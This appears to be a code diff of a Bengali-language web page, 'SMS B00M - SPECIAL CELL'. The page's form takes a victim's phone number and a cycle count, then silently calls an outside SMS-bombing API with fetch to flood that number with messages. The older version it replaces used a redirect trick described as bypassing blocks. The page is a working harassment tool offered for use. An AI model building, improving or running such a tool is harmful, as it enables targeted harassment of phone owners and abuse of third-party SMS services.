@@ -1,70 +1,265 @@
-<script>
-    // আপনার নিরাপত্তা কোড (ডাইরেক্ট অ্যাক্সেস ব্লক) অক্ষুণ্ণ থাকবে
-    (function() {
-      const referrer = document.referrer;
-      const allowedReferrers = ['dashboard.html', 'special_dashboard.html']; 
-      let isAllowed = false;
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SMS B00M - SPECIAL CELL</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    /* Global Styles (Neon Theme) */
+    body {
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      background: radial-gradient(circle at top, #00111a 0%, #000000 100%);
+      font-family: 'Poppins', sans-serif;
+      color: #00eaff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    /* Header/Title Style */
+    header {
+      text-align: center;
+      margin-bottom: 40px;
+      font-size: 28px;
+      font-weight: bold;
+      text-shadow: 0 0 15px #00eaff, 0 0 25px #00eaff;
+      letter-spacing: 2px;
+    }
+    
+    /* Back Button Style */
+    .back-btn {
+      position: absolute;
+      bottom: 40px; /* ড্যাশবোর্ডে ফিরে যাওয়ার বাটনটি নিচে রাখা হলো */
+      padding: 15px 25px;
+      border-radius: 10px;
+      background: #001820;
+      color: #00eaff;
+      font-size: 18px;
+      font-weight: bold;
+      border: 1px solid #00eaff55;
+      cursor: pointer;
+      text-decoration: none;
+      box-shadow: 0 0 8px #00eaff55;
+      transition: 0.3s;
+    }
+    .back-btn:hover {
+      background: #002a33;
+      box-shadow: 0 0 15px #00eaffaa;
+      transform: scale(1.05);
+    }
 
-      for (const allowed of allowedReferrers) {
-          if (referrer.includes(allowed)) {
-              isAllowed = true;
-              break;
-          }
-      }
+    /* Main Container for the form */
+    .boom-container {
+      width: 90%;
+      max-width: 450px;
+      padding: 30px;
+      background: #001820;
+      border-radius: 15px;
+      box-shadow: 0 0 30px #00eaffaa;
+      border: 2px solid #00eaff;
+      animation: pulse-border 1.5s infinite alternate;
+      margin-bottom: 120px; /* Footer/Back Button এর জন্য জায়গা */
+    }
 
-      if (!isAllowed) {
-          window.location.replace('index.html');
-      }
-    })();
-  </script>
+    @keyframes pulse-border {
+      from { border-color: #00eaff; box-shadow: 0 0 30px #00eaffaa; }
+      to { border-color: #0088aa; box-shadow: 0 0 40px #00eaffcc; }
+    }
+
+    /* Form and Input Styles */
+    .form-group {
+      margin-bottom: 25px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 10px;
+      font-size: 18px;
+      font-weight: 700;
+      color: #00eaff;
+      text-shadow: 0 0 5px #00eaff;
+      text-align: center; /* Label-টি মাঝখানে রাখা হলো */
+    }
+
+    input[type="tel"],
+    input[type="number"] {
+      width: calc(100% - 24px);
+      padding: 12px;
+      border-radius: 8px;
+      border: 2px solid #00eaff55;
+      background: #000a10;
+      color: #00eaff;
+      font-size: 18px;
+      box-shadow: 0 0 8px #00eaff55 inset;
+      transition: border-color 0.3s;
+      outline: none;
+      text-align: center;
+    }
+
+    input[type="tel"]:focus,
+    input[type="number"]:focus {
+      border-color: #00eaff;
+      box-shadow: 0 0 15px #00eaffaa, 0 0 15px #00eaffaa inset;
+    }
+
+    /* Button Style */
+    .btn {
+      width: 100%;
+      padding: 18px;
+      border-radius: 12px;
+      background: #003a44;
+      color: #00eaff;
+      font-size: 24px;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      text-shadow: 0 0 10px #00eaff; /* টেক্সটে আরও জোরালো শ্যাডো */
+      box-shadow: 0 0 15px #00eaff88 inset;
+      transition: 0.3s;
+      margin-top: 20px;
+      letter-spacing: 3px;
+    }
+    
+    .btn:hover {
+      transform: scale(1.02);
+      box-shadow: 0 0 30px #00eaffaa, 0 0 40px #00eaff99 inset;
+      background: #004a55;
+    }
+
+    /* Status Message Style */
+    #status-message {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 16px;
+      text-align: center;
+      font-weight: bold;
+      min-height: 20px;
+      color: #00eaff;
+      text-shadow: 0 0 5px #00eaff;
+    }
+
+  </style>
 </head>
 <body>
+
+  <header>SPECIAL CELL - SMS B00M</header>
+
+  <div class="boom-container">
     
+    <div class="form-group">
+      <label for="phoneNumber">আপনার কলিজার নম্বর টি দিন...</label>
+      <input type="tel" id="phoneNumber" placeholder="যেমন: 88017********" required>
+    </div>
+
+    <div class="form-group">
+        <label for="amount">সাইকেল সংখ্যা (সর্বোচ্চ 5)</label>
+        <input type="number" id="amount" placeholder="১ থেকে ৫ দিন" value="3" min="1" max="5" required>
+    </div>
+
+    <button class="btn" onclick="startBoom()">গুতা দিন</button>
+    
+    <div id="status-message">অপেক্ষমান...</div>
+  </div>
+  
+  <a href="special_dashboard.html" class="back-btn">ড্যাশবোর্ড এ ফিরে যান</a>
+
   <script>
-    function triggerSMSBoom() {
-        const numberInput = document.getElementById('targetNumber');
-        const statusDiv = document.getElementById('status');
-        const number = numberInput.value.trim();
-        
-        // ১. ইনপুট ভ্যালিডেশন
-        if (!number || number.length < 10) {
-            statusDiv.textContent = 'দয়া করে সঠিক নম্বর দিন!';
-            statusDiv.style.color = '#ff0055'; 
-            statusDiv.style.textShadow = '0 0 8px #ff0055';
-            return;
-        }
+    // ** ক্লায়েন্ট-সাইড সুরক্ষা (নিরাপত্তা অংশ) **
+    // যদি কেউ সরাসরি লিঙ্কে ক্লিক করে, তবে তাকে index.html পেজে পাঠিয়ে দেওয়া হবে।
+    (function(){
+      try {
+        var auth = sessionStorage.getItem('uca_auth');
+      } catch(e) {
+        var auth = null;
+      }
+      if (!auth) {
+        var next = encodeURIComponent(location.pathname + location.search + location.hash);
+        location.replace('index.html?next=' + next);
+      }
+    })();
 
-        // ২. API URL
-        // আপনার API URL, যা এখন রিডাইরেক্টের জন্য ব্যবহৃত হবে
-        const apiUrl = `http://mahfuz-boom.gt.tc/?number=${number}&cycles=3`;
-        
-        // ৩. স্ট্যাটাস আপডেট
-        statusDiv.textContent = 'SMS B00M শুরু হচ্ছে... (ব্লক বাইপাস করা হচ্ছে)';
-        statusDiv.style.color = '#00eaff';
-        statusDiv.style.textShadow = '0 0 8px #00eaff';
 
-        // ৪. চূড়ান্ত কৌশল: দ্রুত রিডাইরেক্ট এবং ফেরত আসা (The Redirect Trick)
-        
-        // ক. বর্তমান URL সংরক্ষণ করা
-        const currentPageUrl = window.location.href;
+    /**
+     * কোর ফাংশন: ব্যাকগ্রাউন্ডে API কল করে।
+     */
+    function startBoom() {
+      // 1. Get Input Values
+      const phoneNumber = document.getElementById('phoneNumber').value.trim();
+      const amount = parseInt(document.getElementById('amount').value);
+      const statusMessage = document.getElementById('status-message');
+      const startButton = document.querySelector('.btn');
 
-        // খ. এক মুহূর্তের জন্য API URL এ রিডাইরেক্ট করা
-        window.location.replace(apiUrl);
+      // 2. Input Validation
+      // API প্রদানকারীর নির্দেশ অনুযায়ী Cycles 5 এর বেশি হবে না
+      if (!phoneNumber || phoneNumber.length < 10) {
+        statusMessage.innerHTML = '<span style="color: #ff5555; text-shadow: 0 0 5px #ff0000;">❌ ত্রুটি: অনুগ্রহ করে সঠিক নম্বর দিন!</span>';
+        return;
+      }
+      if (isNaN(amount) || amount < 1 || amount > 5) { 
+        statusMessage.innerHTML = '<span style="color: #ff5555; text-shadow: 0 0 5px #ff0000;">❌ সতর্কতা: সাইকেল সংখ্যা ১ থেকে ৫-এর মধ্যে হতে হবে!</span>';
+        return;
+      }
 
-        // গ. দ্রুত ফেরত আসার জন্য টাইমআউট
-        // API কলটি শুরু হওয়ার জন্য ০.৫ সেকেন্ডের বেশি সময় দেওয়া উচিত নয়।
-        setTimeout(() => {
-            // API কল শুরু হওয়ার পর দ্রুত আপনার পেজে ফেরত আসা
-            window.location.replace(currentPageUrl);
-        }, 500); // ০.৫ সেকেন্ড পর ফেরত আসবে
-        
-        // ঘ. ব্যবহারকারীকে আশ্বাস দেওয়া (এই বার্তাটি দেখানোর আগেই রিডাইরেক্ট হবে, 
-        // কিন্তু এটি কোডটি বোঝার জন্য রাখা হয়েছে)
-        statusDiv.textContent = `সফল! বোমবিং শুরু হয়েছে।`;
-        statusDiv.style.color = '#00ffaa'; 
-        statusDiv.style.textShadow = '0 0 8px #00ffaa';
+      // 3. Prepare API URL
+      const API_BASE_URL = 'http://mahfuz-boom.gt.tc/'; 
+      // নম্বর এবং সাইকেল ডাইনামিকভাবে URL এ যুক্ত করা হলো
+      const finalApiUrl = `${API_BASE_URL}?number=${phoneNumber}&cycles=${amount}`; 
 
+      // 4. Update UI for start
+      statusMessage.innerHTML = `<span style="color: #00eaff; text-shadow: 0 0 8px #00eaff;">📡 ${amount} বার গুতা দেওয়া হচ্ছে (${phoneNumber})...</span>`;
+      startButton.disabled = true;
+      startButton.textContent = 'গুতা চলছে...';
+      startButton.style.background = '#aa00ff'; 
+      startButton.style.boxShadow = '0 0 20px #aa00ffaa inset';
+
+      // 5. Silent API Call using Fetch
+      fetch(finalApiUrl)
+      .then(response => {
+          // যেহেতু API টি কোনো ডেটা রিটার্ন করে না, শুধু স্ট্যাটাস কোড চেক করা হলো
+          if (response.ok) {
+              // স্ট্যাটাস কোড 200 মানে কল সফল
+              statusMessage.innerHTML = `
+                  <span style="color: #33ff33; text-shadow: 0 0 10px #00ff00;">
+                      ✅ গুতা সফলভাবে দেওয়া হয়েছে!
+                      <br>
+                      ${amount} সাইকেল সম্পন্ন হয়েছে (${phoneNumber}).
+                  </span>
+              `;
+          } else {
+               // সার্ভার থেকে ত্রুটি পেলে
+              statusMessage.innerHTML = `
+                  <span style="color: #ff5555; text-shadow: 0 0 5px #ff0000;">
+                      ❌ API ত্রুটি! স্ট্যাটাস: ${response.status}.
+                  </span>
+              `;
+          }
+      })
+      .catch(error => {
+          // নেটওয়ার্ক বা CORS ত্রুটি হ্যান্ডেল করা হলো
+          statusMessage.innerHTML = `
+              <span style="color: #ff5555; text-shadow: 0 0 5px #ff0000;">
+                  ❌ সংযোগ ত্রুটি! API-এর সাথে যোগাযোগ করা যায়নি।
+              </span>
+          `;
+          console.error('Fetch Error:', error);
+      })
+      .finally(() => {
+          // 6. Reset button state after a small delay
+          setTimeout(() => { 
+              startButton.disabled = false;
+              startButton.textContent = 'গুতা দিন';
+              startButton.style.background = '#003a44';
+              startButton.style.boxShadow = '0 0 15px #00eaff88 inset';
+          }, 3000); 
+      });
     }
+
   </script>
+
 </body>
 </html>
